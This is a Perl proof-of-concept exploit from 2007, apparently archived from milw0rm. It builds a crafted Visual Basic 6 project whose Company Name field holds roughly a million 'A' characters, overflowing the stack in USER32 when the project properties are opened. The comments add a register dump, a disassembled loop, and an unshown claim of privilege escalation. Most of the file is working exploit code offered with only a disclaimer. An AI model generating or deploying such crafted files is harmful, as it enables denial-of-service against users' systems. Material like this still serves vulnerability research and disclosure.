#!/usr/local/bin/perl


#Discovered By UmZ (Umair Manzoor)
#comments are welcome at umz32.dll[at]gmail.com
#Dated 23-02-2007
#Time : 02:00 AM PST
#
#Visual Basic Project (Company Name) Stack Overflow
#Affected Version  : Tested on Visual basic 6
#Threats : DoS, Previlidges Escilation (System become unstable for more then 40 minutes and so)
#From : Local system
#
#Actually Exception occur again and again and again make 100% usage of CPU
#
#
#*The vulnerability would not effect until the project description (Project Property page and select Company Name) has been opened up to view.
#
#*When binary file is generated with crafted Visual basic project it would not contain any details of vendor and other information.

#Details:
#       Owned Registers are ESI and EDI. Compnay name is dumped at Memory Address of : 04520020. Due to stack overflow USER32 stuck into loop (that last #       for more then 30 minutes in testing).
#         
#	The CPU usuage becomes 100% causing the system to become unstable and can crash the OS if enduser is on low system memory. This vulnerability can
#       be exploit to cause DOS or Previledge escilation. UNICODE exploitation must be implemented in order to exploit this vulnerability. 
#	The generated Binary File is also attached which cann't display any of details of vendor information in EXE format (due to overflow).
#
#Debug Details:
#      This is the debug details which clearly mention the loop in which exception got stuck, causing it to occur again and again
#
#77D8D96F   837D F8 00       CMP DWORD PTR SS:[EBP-8],0
#77D8D973   74 08            JE SHORT USER32.77D8D97D
#77D8D975   3C 20            CMP AL,20
#77D8D977   74 04            JE SHORT USER32.77D8D97D
#77D8D979   3C 09            CMP AL,9
#77D8D97B   75 2C            JNZ SHORT USER32.77D8D9A9
#77D8D97D   3C 0D            CMP AL,0D
#77D8D97F   74 28            JE SHORT USER32.77D8D9A9
#77D8D981   50               PUSH EAX
#77D8D982   53               PUSH EBX
#77D8D983   E8 68FAFFFF      CALL USER32.77D8D3F0
#77D8D988   85C0             TEST EAX,EAX
#77D8D98A   75 1D            JNZ SHORT USER32.77D8D9A9
#77D8D98C   47               INC EDI
#77D8D98D   8A07             MOV AL,BYTE PTR DS:[EDI]
#77D8D98F   3C 20            CMP AL,20
#77D8D991   74 04            JE SHORT USER32.77D8D997
#77D8D993   3C 09            CMP AL,9
#77D8D995   75 07            JNZ SHORT USER32.77D8D99E
#77D8D997   C745 F8 01000000 MOV DWORD PTR SS:[EBP-8],1
#77D8D99E   807F FF 0A       CMP BYTE PTR DS:[EDI-1],0A
#77D8D9A2   74 05            JE SHORT USER32.77D8D9A9
#77D8D9A4   3B7D 10          CMP EDI,DWORD PTR SS:[EBP+10]
#77D8D9A7  ^72 C6            JB SHORT USER32.77D8D96F
#
#
#Values of Register are as follows:
#EAX 00000041
#ECX 09E0C300
#EDX 00150608
#EBX 001DC0C0
#ESP 0013E900
#EBP 0013E914
#ESI 04520020 ASCII #"AAAAAAAAAAAAAAAAA......... truncated

#EDI 045E61D0 ASCII #"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ..... truncated
#EIP 77D8D96F USER32.77D8D96F
#
#
#	    Disclaimer: This Proof of concept exploit is for educational purpose only.
#		        Please do not use it against any system without prior permission.
#          		You are responsible for yourself for what you do with this code.

# This exploit is just POC, it will generate the crafted VB project.


print("\nVisual Basic Company Name Stack overflow");
print("\nAffected Version  : Tested on Visual basic 6");
print("\nThreats : DoS, Previlidges Escilation");
print("\nFrom : Local system");
print("\n----------------------------------------------");
print("\nDiscovered & Coded by UmZ"); 
print("\numz32.dll[at]gmail.com");
 

open (MYFILE, '>>Form2.frm');
print MYFILE "VERSION 5.00\n";
print MYFILE "Begin VB.Form Form1\n"; 
print MYFILE q(Caption         =   "Form1");
print MYFILE "\nClientHeight    =   3495\n";
print MYFILE "ClientLeft      =   60\n";
print MYFILE "ClientTop       =   345\n";
print MYFILE "ClientWidth     =   4680\n";
print MYFILE q(LinkTopic       =   "Form1");
print MYFILE "\nScaleHeight     =   3495\n";
print MYFILE "ScaleWidth      =   4680\n";
print MYFILE "StartUpPosition =   3  'Windows Default\n";
print MYFILE "Begin VB.CommandButton Command2\n"; 
print MYFILE q(Caption         =   "write");
print MYFILE "\nHeight          =   495\n";
print MYFILE "Left            =   2400\n";
print MYFILE "TabIndex        =   2\n";
print MYFILE "Top             =   2640\n";
print MYFILE "Width           =   1935\n";
print MYFILE "End\n";
print MYFILE "Begin VB.TextBox Text1\n"; 
print MYFILE "Height          =   2175\n";
print MYFILE "Left            =   480\n";
print MYFILE "MultiLine       =   -1  'True\n";
print MYFILE "TabIndex        =   1\n";
print MYFILE q(Text            =   "Form1.frx":0000);
print MYFILE "\nTop             =   360\n";
print MYFILE "Width           =   3855\n";
print MYFILE "End\n";
print MYFILE "Begin VB.CommandButton Command1\n"; 
print MYFILE q(Caption         =   "read");
print MYFILE "\nHeight          =   495\n";
print MYFILE "Left            =   480\n";
print MYFILE "TabIndex        =   0\n";
print MYFILE "Top             =   2640\n";
print MYFILE "Width           =   1935\n";
print MYFILE "End\n";
print MYFILE "End\n";

print MYFILE q(Attribute VB_Name = "Form1");
print MYFILE "\nAttribute VB_GlobalNameSpace = False\n";
print MYFILE "Attribute VB_Creatable = False\n";
print MYFILE "Attribute VB_PredeclaredId = True\n";
print MYFILE "Attribute VB_Exposed = False\n";
close (MYFILE);

open (MYFILE, '>>vuln2.vbp');
print MYFILE "Type=Exe\n";
print MYFILE "Reference=*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\\..\\..\\..\\WINDOWS\\system32\\stdole2.tlb#OLE Automation\n";
print MYFILE "Reference=*\\G{420B2830-E718-11CF-893D-00A0C9054228}#1.0#0#..\\..\\..\\..\\WINDOWS\\system32\\scrrun.dll#Microsoft Scripting Runtime\n";
print MYFILE "Form=Form2.frm\n";
print MYFILE q(Startup="Form2");
print MYFILE "\nHelpFile=".q("");
print MYFILE "\nCommand32=".q("");
print MYFILE "\nName=".q("Project1");
print MYFILE "\nHelpContextID=".q("0");
#print MYFILE "\nDescription=".q(")."A" x1037690 .q(");
print MYFILE "\nCompatibleMode=".q("0");
print MYFILE "\nMajorVer=1";
print MYFILE "\nMinorVer=0";
print MYFILE "\nRevisionVer=0";
print MYFILE "\nAutoIncrementVer=0";
print MYFILE "\nServerSupportFiles=0";
print MYFILE "\nVersionCompanyName=".q(")."A" x1037690 .q(");
print MYFILE "\nCompilationType=0";
print MYFILE "\nOptimizationType=0";
print MYFILE "\nFavorPentiumPro(tm)=0";
print MYFILE "\nCodeViewDebugInfo=0";
print MYFILE "\nNoAliasing=0";
print MYFILE "\nBoundsCheck=0";
print MYFILE "\nOverflowCheck=0";
print MYFILE "\nFlPointCheck=0";
print MYFILE "\nFDIVCheck=0";
print MYFILE "\nUnroundedFP=0";
print MYFILE "\nStartMode=0";
print MYFILE "\nUnattended=0";
print MYFILE "\nRetained=0";
print MYFILE "\nThreadPerObject=0";
print MYFILE "\nMaxNumberOfThreads=1";
print MYFILE "\n[MS Transaction Server]";
print MYFILE "\nAutoRefresh=1";

close (MYFILE);

print("\n\nCrafted Project has been generated!!!\n\n");

# milw0rm.com [2007-05-23]
